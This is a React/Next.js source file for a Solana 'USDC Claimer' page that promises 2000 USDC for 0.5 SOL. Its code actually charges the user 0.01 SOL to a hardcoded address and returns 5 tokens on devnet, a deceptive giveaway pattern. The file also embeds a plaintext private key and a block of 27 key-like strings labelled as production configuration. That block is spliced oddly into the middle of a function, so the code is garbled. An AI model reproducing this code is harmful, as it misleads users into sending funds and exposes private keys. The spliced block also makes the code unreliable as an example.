/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "3kj8NPnrgkgqCuhZ6q5bcuZrqfJNPWDm7ZFvWfYsnJw1eyisxfWHugYs4PSmu315fN3nnpJHBAZ3KPP2X5eE9Ndk"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "2ZYQbJdtpPga2g75TG4c6zwJY4jorM5bRE572Bo2mGzFAfw9dfdSAzBXQo36ubkPNNdbwumuqkLDpx1EnPHU7EuB",
  "key1": "5wcA4czUEKmBGGEyQsac2sYzizd7Wi6ytZVt2bveW3z3zquKAD6dQCMr5grvrBUzMEHqNZHM91zU8MRwrT9xm1sv",
  "key2": "5GMSsefdV2fscX23JXijnsj5fURjf7Ff14wWmgwXv6T2JUPeZHixpVi652MNh4WAH3dRnFTNYEXDZK2VcPUSPLdN",
  "key3": "3TY26o3apF3UL1itrU4aLcsFEC8rs4RB7TJnaNrPNvsoCcwtWboyqYYvQhZg9r4z4C8keiChjDVWkjEE2XCkkDZp",
  "key4": "2PpvNTYE4BncVBC9TqEFoDPUDM2byipcDa5pLF1EEzqc6AvvcxEd9jAzLdWoDxzVKDfpMwMTKgm9PudYUFSoYMUP",
  "key5": "4NC11D7FqqSVbXFrg8WayZ5FkFDzFdSovdKn1XqtSMJoD59ZZzaBCaTL8q8cPPS9g96WwMR63WuUbHuHsMyBJohQ",
  "key6": "5ZBwt9NjgCJAWX3qBmVizJGbYk1QB245TTbRgDCrGHb68oEBQDkHQwMocwiwGhHKi3GPevq9rRPSQUx7mhdF1QDR",
  "key7": "5cVxicv7RDkPFWgesTMsRBM4hSkLqYZLqyguhT2PJ88k9siy6tDJwFbd97nWL8vVpU3AB8fc4bkdUJoxbnCQMJ7c",
  "key8": "55pwmCjFyyUJaZsgxDjt9z13RwjAh5RvQiwoynJXdtsYSkkzdZzgEKLxmne4saAy4uoamU5e2EyFu9XM2axdVAYY",
  "key9": "3qdeJi6YG7vvJVpTFUzvHtoytQiLMHhqA4XKPkZ7qpxjRTqvc8zACGo8uCp2GgLmiGYLSeQooq93whR9CREhVVyP",
  "key10": "5qZ4g3Q3NdZCFjEyW1QtQ4ND7XTbxgJtwRiDE6QZkxpqsvdhRsbY6xvwSNUBivoPDz2Ps5k7dmz5pvewiWZuLQyn",
  "key11": "3H2UZmComrkqehvkTTZQt3xkKkzUcra5CwZ6vCAcTzXpUKqnN8hba2Nq2R5jUwtrqFyTfuoC9FjX5w8QezQ4HyZi",
  "key12": "dUZ9qzC7n8bLKRtpk4LvjnvusmGRVyDnzDapvugk9TYQYTECsh337mdRBGqPHJXEW2vyaqdx1DZkxt3ynBXhUpT",
  "key13": "5ou2RPUoPBq5fBEouN6jemoGkP8kNS2N8tumLrieuXA5n6Uv5Nz5yHpgkHEh9kfhgsiNUD1mL7Pax2GMd51kzGbg",
  "key14": "4VQ7nUNwkFrtqzjW4u4phu7UhY9dZjXzW3qrxFg2QVKCZSA7m9or5BWAwY8GaLgiZzcgetHZLzztkmULhmcCLnkG",
  "key15": "4YhvWJBP5dqmYGd9nm98zEv7tMFVx8Ly6XcrZBhubaEFawUi2d6tk1qFWfuSUrf4RzaNXXHCYe2nzukmjF1ofZnn",
  "key16": "BeoS5cfimt2571R9HH7cSw8Cq5YhzNdTMgdv18Pv8NbLyojhrGb4TDDgFpbfzRpKL7ZWZffZ7wKbSf6J7zPZTGg",
  "key17": "3dT9j9kPW24vMzXWcEDARHyLpxCvAG7SqgzQC4PAMK7EoxJc9bS4eNgDUfphGhDAnWuUZxS77ab7YRPy92oeoTHP",
  "key18": "3kY4vo5JQVtAXghASJvEBpoYt2W5wHAbRtQ4bZCpJPZowUyWSMZjgHtQPgFxSbswReJBm1CWf7gT5ibK2SujZLcT",
  "key19": "2W6wWHiVBHvjGkGi9wQ6FB9GKKYo6MAvUStizVtwNdqoMGbQD7JQAgPmeDorAPpduRLY63gQrRH7yJiqyLvxKLeH",
  "key20": "4xntbCm49EmpcxGiAne1iVNt647gcKq9YjxBieKY5Dmoe1A5bENLwpZXbhHt1rddzrD5YxVuHP7JGiyXXxStmKZB",
  "key21": "4JyWerk2czayfMtDADVXg2P7ZqLYdvCQKtmVjNqta8gZSu5xMBifUbZKsFR7kQTTYjBszfBNwvJfVQ5od1xn4xzn",
  "key22": "24sx5XV3X6Fffgy6MLzHHRXjQwjALHi4zc6NPpyHocEmHRwYxQC2LdEwccBb6eJP6vwHGr7wDBSyZykRWAQ3ub9g",
  "key23": "VSTLr1jSh395ADZwvA2D6j6pXtMjiHu6BphJ1fxrwdFY3jR2PGvMLNdtBofesNyayK8Xvr3zEHrnfg5LENKaDpF",
  "key24": "42upPeDqkdLzPBjZP25AkBGDXhrfJKeMeECXGir5zkRVbuT4gAXko55vyKyRkMHy8z9iFB5cUrsNwKazx2esKx1N",
  "key25": "4AY1b78CBK5NPy6no2MVv1aUgJgtYm6sZWHmmuNkDs8dMpbd8hHS9Nw463FjzWUU6Kw9yd5Km8NCjZwn8BspUoo5",
  "key26": "5zn2unFNQVak2H1mxQAFHH56wCrgozH1Zu1aAw8MJZyjRsYr9tufYDwYSfJz7WZyzAYdN9hCikhW2tso3FGD2zRi"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
